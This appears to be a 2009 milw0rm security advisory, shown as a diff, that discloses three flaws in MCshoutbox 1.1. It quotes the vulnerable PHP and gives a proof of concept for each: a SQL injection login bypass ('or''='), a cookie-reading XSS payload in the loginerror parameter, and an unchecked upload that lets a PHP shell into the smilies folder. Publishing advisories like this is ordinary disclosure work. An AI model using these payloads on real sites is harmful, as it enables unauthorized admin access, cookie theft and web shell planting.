@@ -1,0 +1,76 @@
+###########################################################################################
+[+] MCshoutbox 1.1 (SQL/XSS/Shell) Multiple Remote Vulnerabilities
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+############################################################################################
+
+Homepage : http://www.maniacomputer.com/dload/MCshoutbox_Download_Page.html
+
+[+] SQL Injection Login Bypass
+
+ - Note : magic_quotes_gpc = off
+
+ - Vulnerable code in scr_login.php
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+$admin_name = trim($_REQUEST[ 'username' ]);
+$admin_password = trim($_REQUEST[ 'password' ]);
+ connect($host,$username,$password,$database);
+$query = "SELECT * FROM admin_tbl WHERE admin_name = ''or''='' AND
+admin_password = ''or''=''" ;
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ - PoC
+
+  URL : http://127.0.0.1/[path]/admin_login.php
+  Username : 'or''='
+  Password : 'or''='
+
+[+] Cross-Site Scripting
+
+ - Vulnerable code in admin_login.php
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+if(isset($loginerror)){ ?>
+      <tr>
+    <td colspan="2" align="center" style="font-size:18px;
+color:#FFFFFF;" ><?echo $loginerror?></td>
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ - PoC
+
+     http://127.0.0.1/[path]/admin_login.php?loginerror=<script>alert(document.cookie)</script>
+
+
+[+] Shell Upload
+
+ - Note : The extension of the file isn't checked so we can upload our
+evil file.
+
+ - Vulnerable code in admin.php
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+if(isset($_POST['addsmilie'])){
+                 $alt = $_POST['symbol'];
+                $symbol = $_POST['symbol'];
+                $img = $_FILES['image']['name'];
+..............................................................................................................................................
+				$uploadfile = $uploaddir . $_FILES['image']['name'];
+..............................................................................................................................................
+$upload = move_uploaded_file($_FILES['image']['tmp_name'], $uploadfile);
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ - PoC
+
+     URL : http://127.0.0.1/[path]/admin.php?mode=add
+     Symbol Emoticon : anything
+     Path to Smilie : yourshell.php
+
+  - You will find you shell here
+
+        http://127.0.0.1/[path]/smilies/yourshell.php
+
+############################################################################################
+
+# milw0rm.com [2009-07-20]
